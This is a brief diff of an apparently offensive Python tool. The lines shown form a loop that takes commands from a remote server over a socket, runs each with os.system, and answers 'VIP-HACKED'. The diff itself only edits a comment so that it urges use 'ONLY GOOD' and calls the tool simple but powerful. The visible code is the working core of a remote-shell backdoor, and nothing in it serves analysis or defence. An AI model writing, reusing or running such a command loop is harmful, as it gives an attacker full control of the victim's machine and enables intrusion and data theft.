@@ -44,4 +44,4 @@ while run:
     msg = server.recv(1024)
     os.system (msg.decode('UTF-8'))
     server.send('VIP-HACKED'.encode('UTF-8'))
-  #USE THIS TOOL FOR  ONLY  SIMPLE TOOL BUT POWERFULL #
+  #USE THIS TOOL FOR  ONLY GOOD # SIMPLE TOOL BUT POWERFULL #
